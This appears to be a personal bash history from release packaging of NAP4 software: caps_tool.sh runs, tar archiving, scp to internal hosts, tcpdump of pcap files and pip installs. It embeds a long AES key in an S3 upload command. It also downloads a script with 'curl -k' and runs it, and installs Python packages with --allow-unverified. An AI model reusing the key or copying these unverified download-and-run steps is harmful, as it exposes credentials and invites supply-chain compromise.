bash -x ./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/
" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
bash -x ./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
bash -x ./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
cleanAppName=monitoring-agent-1.1.0-1
echo ${cleanAppName//-*}
echo ${cleanAppName/-*}
echo ${cleanAppName%-*}
echo ${cleanAppName%%-*}
echo ${cleanAppName%-*}
./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
echo ${cleanAppName%-*}
./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
echo ${cleanAppName%-*}
echo ${cleanAppName%*-}
echo ${cleanAppName%%*-}
echo ${cleanAppName//*-}
echo ${cleanAppName##*-}
echo ${cleanAppName#*-}
echo ${cleanAppName#-*}
echo ${cleanAppName##-*}
echo ${cleanAppName%*-}
echo ${cleanAppName%-*}
cleanAppName=NAPppc-1.8.0-1
echo ${cleanAppName%-*}
bash -x ./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/rpms/" -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -product=NAP4 -release="release-4.0.2"
cd /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/
tar czvfhl /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-SRC_release-4.0.2.tar.gz -C /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-SRC_release-4.0.2/ .
2019-02-13 19:18:13 INFO: tar czvfhl /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-SRC_release-4.0.2.tar.gz -C /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-SRC_release-4.0.2/ .
2019-02-13 19:18:13 INFO: tar czvfhl /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-BIN_release-4.0.2.tar.gz -C /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-BIN_release-4.0.2/ .
tar czvfhl /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-BIN_release-4.0.2.tar.gz -C /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-BIN_release-4.0.2/ .
tar czvfhl /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-DOC_release-4.0.2.tar.gz -C /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/NAP4-DOC_release-4.0.2/ .
exit
i3
ls -alh
less .i3/
less .i3/config 
st
apt-get install st
sudo apt-get install terminator
vi .bashrc
DISPLAY=:0 terminator &
vi .i3/config 
i3 &
kill 4822
vi .i3/config 
i3status
apt-get install i3status
i3status
vi .i3/config 
dmenu
apt-get install suckless-tools
i3 &
i3status
kill 5488
vi .i3/config 
cd /c/nokia_git/napOperations/
ll
cd bin/
ll
scp napHelper.sh nap@ncsnv001:/home/nap/napHelper2.sh
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/
ll
cd ProductionPackages/
ll
scp *.rpm *.sh nap@ncsnv001:/var/opt/nap/packages/
scp /c/nokia_git/napOperations/bin/napHelper.sh nap@ncsda001:/home/nap/napHelper2.sh
scp /c/nokia_git/napOperations/bin/napHelper.sh nap@ncsel001:/home/nap/napHelper2.sh
cd MW3
cd ../MW3
ll
cd wo3957984task7/
ll
scp -r nap@ncsnv001:/var/opt/tmp/wo3957984task7/* logs/
cd ../..
cd .
cd ..
mkdir CAPS
cd CAPs
cd CAPS/
cd ../../
cd ..
ll
./caps_tool.sh -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/"
ls -alh /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS
ls -alh
./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/"
ls -alh /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS
bash -x ./caps_tool.sh -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/"
rm -rf /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/*
bash -x ./caps_tool.sh -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/"
ls -alh /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/
bash -x ./caps_tool.sh -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/"
ls -alh /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/
bash -x ./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/"
bash -x ./caps_tool.sh
./caps_tool.sh
bash -x ./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -apps="APTOnsrsource-1.4.0-1.el7.x86_64.rpm monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgp-1.11.0-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPgui-1.8.5-1.x86_64.rpm NSNNAPoperations-1.0.4-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPqueuing-0.5.0-00.01.base-linux-x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_partner_sync-0.0.5-00.00.base-linux-x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm APTOnsrsource-1.2.1-1.sles11.x86_64.rpm"
bash -x ./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -apps="APTOnsrsource-1.4.0-1.el7.x86_64.rpm monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgp-1.11.0-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPgui-1.8.5-1.x86_64.rpm NSNNAPoperations-1.0.4-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPqueuing-0.5.0-00.01.base-linux-x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_partner_sync-0.0.5-00.00.base-linux-x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm APTOnsrsource-1.2.1-1.sles11.x86_64.rpm" -product=NAP4 -release="release-4.1.5"
echo APTOnsrsource-1.2.1-1.sles11.x86_64.rpm | sed 's/.sles11.x86_64.rpm|.el7.x86_64.rpm|.x86_64.rpm|.base-linux-x86_64.rpm//g'
echo APTOnsrsource-1.2.1-1.sles11.x86_64.rpm | sed 's/.sles11.x86_64.rpm\|.el7.x86_64.rpm\|.x86_64.rpm\|.base-linux-x86_64.rpm//g'
removePatterns=".sles11.x86_64.rpm|.el7.x86_64.rpm|.x86_64.rpm|.base-linux-x86_64.rpm"
echo ${removePatterns/\/\\\/}
echo ${removePatterns/\//\\\/}
echo ${removePatterns//\//\\\/}
echo ${removePatterns#/}
echo ${removePatterns#\|}
echo ${removePatterns##\|}
echo ${removePatterns:##\|}
echo ${removePatterns//\|/}
echo ${removePatterns//\|/\\\|}
bash -x ./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -apps="APTOnsrsource-1.4.0-1.el7.x86_64.rpm monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgp-1.11.0-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPgui-1.8.5-1.x86_64.rpm NSNNAPoperations-1.0.4-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPqueuing-0.5.0-00.01.base-linux-x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_partner_sync-0.0.5-00.00.base-linux-x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm APTOnsrsource-1.2.1-1.sles11.x86_64.rpm" -product=NAP4 -release="release-4.1.5"
./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -apps="APTOnsrsource-1.4.0-1.el7.x86_64.rpm monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgp-1.11.0-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPgui-1.8.5-1.x86_64.rpm NSNNAPoperations-1.0.4-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPqueuing-0.5.0-00.01.base-linux-x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_partner_sync-0.0.5-00.00.base-linux-x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm APTOnsrsource-1.2.1-1.sles11.x86_64.rpm" -product=NAP4 -release="release-4.1.5"
ls rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/*.rpm
./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -apps="nap-4.1.4-1.x86_64.rpm NSNNAPcookbooks-2.0.5-1.x86_64.rpm NSNNAPgp-2.0.0-1.x86_64.rpm NSNNAPgui-1.9.0-1.x86_64.rpm NSNNAPoperations-1.0.5-1.x86_64.rpm NSNNAPppc-2.0.5-1.x86_64.rpm NSNNAPqpt-3.0.2-1.x86_64.rpm NSNNAPqueuing-2.0.3-1.x86_64.rpm NSNNAPtool_counter-2.0.1-1.x86_64.rpm NSNNAPtool_tick-2.0.1-1.x86_64.rpm" -product=NAP4 -release="release-4.1.5"
./caps_tool.sh start -call -d="/c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/" -apps="APTOnsrsource-1.4.0-1.el7.x86_64.rpm monitoring-agent-1.1.0-1.x86_64.rpm NSNNAPautomonitoring-1.5.7-1.x86_64.rpm NSNNAPbatchexp-1.1.0-1.x86_64.rpm NSNNAPbom-0.1.3-00.00.base-linux-x86_64.rpm NSNNAPcntdb_prov-1.6.2-1.x86_64.rpm NSNNAPgp-1.11.0-1.x86_64.rpm NSNNAPgploader-client-1.0.1-1.x86_64.rpm NSNNAPgploader-server-1.3.2-1.x86_64.rpm NSNNAPgui-1.8.5-1.x86_64.rpm NSNNAPoperations-1.0.4-1.x86_64.rpm NSNNAPppc-1.8.0-1.x86_64.rpm NSNNAPqpt-2.3.0-1.x86_64.rpm NSNNAPqueuing-0.5.0-00.01.base-linux-x86_64.rpm NSNNAPreports-1.8.3-1.x86_64.rpm NSNNAPtool_bulkprov-0.2.9-1.x86_64.rpm NSNNAPtool_counter-1.2.0-1.x86_64.rpm NSNNAPtool_partner_sync-0.0.5-00.00.base-linux-x86_64.rpm NSNNAPtool_password-1.1.0-1.x86_64.rpm NSNNAPtool_remove_exp_soc-1.3.0-1.x86_64.rpm NSNNAPtool_socr_ct-1.4.0-1.x86_64.rpm NSNNAPtool_tick-1.4.0-1.x86_64.rpm nap-4.0.2-1.x86_64.rpm NSNNAPcookbooks-1.9.1-1.x86_64.rpm APTOnsrsource-1.2.1-1.sles11.x86_64.rpm" -product=NAP4 -release="release-4.0.2"
cd rel-4.1.0-Drop2/release-4.1.5/
ll
cd CAPS/
ll
ls *NSNNAPgui-1.9.0*/*
ls -1 *NSNNAPgui-1.9.0*/*
tar -czvf NAP4_release-4.1.5_NSNNAPgui-1.9.0-1_SRC.tar.gz NAP4_release-4.1.5_NSNNAPgui-1.9.0-1_SRC
tar -czvf NAP4_release-4.1.5_NSNNAPgui-1.9.0-1_BIN.tar.gz NAP4_release-4.1.5_NSNNAPgui-1.9.0-1_BIN
ls -alh
less NAP4_release-4.1.5_NSNNAPgui-1.9.0-1_BIN.tar.gz
less NAP4_release-4.1.5_NSNNAPgui-1.9.0-1_BIN.tar.gz|cat
less NAP4_release-4.1.5_NSNNAPgui-1.9.0-1_SRC.tar.gz|cat
ls -alh
ls rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/*.rpm
ls /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/*.rpm
ls /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/*.rpm | tr "\n" " "
ls /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/*.rpm | xargs -n 1 basename |tr "\n" " "
bbb="$(ls /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/*.rpm | xargs -n 1 basename |tr "\n" " ")"
echo ${bbb// /,}
echo ${bbb/ /,}
echo ${bbb// /,}
echo ${bbb// /,:-1}
echo ${bbb// /,;:-1}
echo ${bbb// /,::-1}
echo ${bbb// /,: :-1}
echo ${bbb// /,|: :-1}
echo ${bbb// /,\|::-1}
echo ${bbb// /,\:\:-1}
echo ${${bbb// /,}::-1}
ccc=${bbb// /,}
echo ${ccc}
echo ${ccc%,}
cd ..
ll
./caps_tool.sh 
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
less /c/putty/*10.248.252.5*
ls -alh /c/putty/*10.248.252.5*
lessGilbert Eu
less /c/putty/10.248.252.5-20190205-232901-putty.log
timpul
cd rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/
ll
cd ProductionPackages/
man tar
cd ../../..
cd ..
ll
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
tar czvfhl NAP4-SRC_release-4.1.5.tar.gz -C /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS//NAP4-SRC_release-4.1.5/ .
ls -alh
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
tar czvfhl /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS//NAP4-SRC_release-4.1.5.tar.gz -C /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS//NAP4-SRC_release-4.1.5/ .
ll
cd rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/ && scp *.rpm *.sh nap@ncsel001:/var/opt/nap/packages/
cd ../
ll
cd MW4/wo3957984task8/
scp -r nap@ncsel001:/var/opt/tmp/wo3957984task8/* logs/
cd
tcpdump
cd /c/NAP/NAP4/
ll
cd rel-4.2.x/
ll
cd EIR/
ll
tcpdump tr.pcap
apt-get install tcpdump
tcpdump -r tr.pcap
tcpdump -rX tr.pcap
tcpdump -X -r tr.pcap
tcpdump -l -r tr.pcap
tcpdump -Xl -r tr.pcap
tcpdump -Xlt -r tr.pcap
tcpdump -Xltq -r tr.pcap
tcpdump -Xltttq -r tr.pcap
tcpdump -ltttq -r tr.pcap
tcpdump -tttq -r tr.pcap
tcpdump -ttt -q -r tr.pcap
tcpdump -ttt -r tr.pcap
tcpdump -tttq -r tr.pcap
tcpdump -tttQ -r tr.pcap
tcpdump -tttD -r tr.pcap
tcpdump -X -r tr.pcap
man tcpdump
tcpdump -A -r tr.pcap
tcpdump -A -r tr1.pcap
tcpdump -Attt -r tr.pcap
tcpdump -Atttl -r tr.pcap
tcpdump -Atttl1 -r tr.pcap
tcpdump -Atttlq -r tr.pcap
tcpdump -qAtttl -r tr.pcap
echo "NSNNAPoperations-1.0.5-1.x86_64.rpm NSNNAPppc-2.0.5-1.x86_64.rpm NSNNAPqpt-3.0.2-1.x86_64.rpm NSNNAPqueuing-2.0.3-1.x86_64.rpm NSNNAPtool_counter-2.0.1-1.x86_64.rpm"
b="NSNNAPoperations-1.0.5-1.x86_64.rpm NSNNAPppc-2.0.5-1.x86_64.rpm NSNNAPqpt-3.0.2-1.x86_64.rpm NSNNAPqueuing-2.0.3-1.x86_64.rpm NSNNAPtool_counter-2.0.1-1.x86_64.rpm"
echo $b
for i in ${b[@]}; do echo $i;done
for i in ${b[@]}; do echo ${i//-};done
for i in ${b[@]}; do echo ${i//-*};done
cd ..
ll
cd ..
ll
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
bash -x ./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
find /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS//sources/ -iname '*NSNNAPoperations*'
find /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/sources/ -iname '*NSNNAPoperations*'
find /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/sources/ -iname '*NAPoperations*'
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
man tar
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
man tar
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
./caps_tool.sh start -call -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
./caps_tool.sh 
./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
bash -x ./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
/caps_tool.sh start -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
./caps_tool.sh start -s="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/sources/" -b="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/" -d="/c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/CAPS/" -product=NAP4 -release="release-4.1.5"
cd /c/miscprojects/
ll
cd anyconnectVPNswitcher/
ll
cd ..
mkdir ciscoAnyconnectControll
ll
cd ciscoAnyconnectControll/
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/ProductionPackages/
ls -1
cd /c/miscprojects/
ll
cd cooltest/
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_01"
ll
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_QueueR_01"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_Custom_CAS205704Z4Q6"
./startTest.sh TC_rel4.1.0-tmolab.rb "test_TC_Custom_CAS205704Z4Q6_01"
exit
cd /c/nokia_git/
ll
cd napPerformanceTestSuite/
git log
ls -alh
less .git/config 
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/MW7-update-pooling-NVL/wo2780632task72/
ll
scp -r nap@ncsnv001:/var/opt/tmp/wo2780632task72/* logs/
cd /c/miscprojects/cooltest/
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_02"
./startTest.sh tests/TC_rel3.9.0.rb "test_TC_NSNNAPTHREE1489_01"
./startTest.sh TC_rel3.9.0.rb "test_TC_NSNNAPTHREE1489_01"
ruby --version
./startTest.sh TC_rel3.9.0.rb "test_TC_NSNNAPTHREE1489_01"
./startTest.sh TC_PC-QS-IS-E2E.rb "test_TC_QS_02"
exit
cd /c/NAP/NAP4/rel-4.1.0-Drop2/release-4.1.5/ProductionInstalls/MW6-update-pooling-DAL/wo2780632task71/
mkdir logs
scp -r nap@ncsda001:/var/opt/tmp/wo2780632task71/* logs/
cd ../..
cd ..
ll
sudo apt-get install python2.7.14
sudo apt-get install python2.7
pip
apt-get install python-pip
pip
pip install boto gmp Pycrypto
pip install Pycrypto
pip install GMP
sudo apt-get install libgmp-dev
pip install GMP
less /root/.pip/pip.log
pip install --upgrade pip
pip --version
pip install GMP --allow-unverified
pip install --allow-unverified GMP
less .pip/pip.log
ls -alh
less ~/.pip/pip.log
pip install GMP=6.1.0 --allow-unverified
pip install GMP=6.1.0
pip install GMP=6.1.0 --allow-unverified GMP
pip install GMP --allow-unverified GMP
less ~/.pip/pip.log
pip install PyGMP --allow-unverified PyGMP
curl https://pypi.org/simple/ | grep -i gmp
pip install Pycrypto
less ~/.pip/pip.log
pip install Pycrypto
sudo apt-get install python2.7-dev
pip install Pycrypto
apt-get update
apt-get upgrade
ping s3-us-1.eecloud.nsn-net.net
ping ch-dc-s3-gsn-33.eecloud.nsn-net.net
curl  -s ch-dc-s3-gsn-33.eecloud.nsn-net.net
python -V
git --version
m4 --version
mkdir CAPS
mv caps_tool.sh CAPS
cd CAPS
sudo curl -k -O https://caps.americas.nsn-net.net/attachments/21950991/caps_sa_upload_s3.py
ll
sudo chmod 755 caps_sa_upload_s3.py
ll
caps_sa_upload_s3.py -v -np 4 -s 64  --aes --location MCT_rel4.0.2 -k S3@ch-dc-s3-gsn-33.eecloud.nsn-net.net:AES:8a00000000000000b2fa62361126a98283c9b71db9dcbd37bce4f724b96a83946c2a688b8f87558cee8533678cf2ba691b7ec160c22aa1b3bf32c69e68f5bcb83cec8dad0f314aaf024f6d0ccc953f3a1bb6f4b71d1b0b4c86e27babd314cda740de812373b597306ca3aa03956a09a14f87cfbcdcbe93c7abbffb16e439310b3535ec9e92ae359172e4d1f2f59c6d91722f1a12edb9a9c322f0686eee2616d241fbb0765b5b7bef --buildlabel "4.0.2" /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/out/
./caps_sa_upload_s3.py -v -np 4 -s 64  --aes --location MCT_rel4.0.2 -k S3@ch-dc-s3-gsn-33.eecloud.nsn-net.net:AES:8a00000000000000b2fa62361126a98283c9b71db9dcbd37bce4f724b96a83946c2a688b8f87558cee8533678cf2ba691b7ec160c22aa1b3bf32c69e68f5bcb83cec8dad0f314aaf024f6d0ccc953f3a1bb6f4b71d1b0b4c86e27babd314cda740de812373b597306ca3aa03956a09a14f87cfbcdcbe93c7abbffb16e439310b3535ec9e92ae359172e4d1f2f59c6d91722f1a12edb9a9c322f0686eee2616d241fbb0765b5b7bef --buildlabel "4.0.2" /c/NAP/NAP4/rel-4.0.0-Drop1/release-4.0.2/CAPS/out/
less caps_sa_upload_s3.py 
curl -kvi -O https://caps.americas.nsn-net.net/attachments/21950991/caps_sa_upload_s3.py
cd /c/miscprojects/anyconnectVPNswitcher/
ll
cd ..
ll
cd ciscoAnyconnectControll/
ll
git commit -m "commented MsgBox from ini_getsectiontext"
git commit -m "commented MsgBox from ini_getsectiontext" anyconnectControll.ahk 
git push
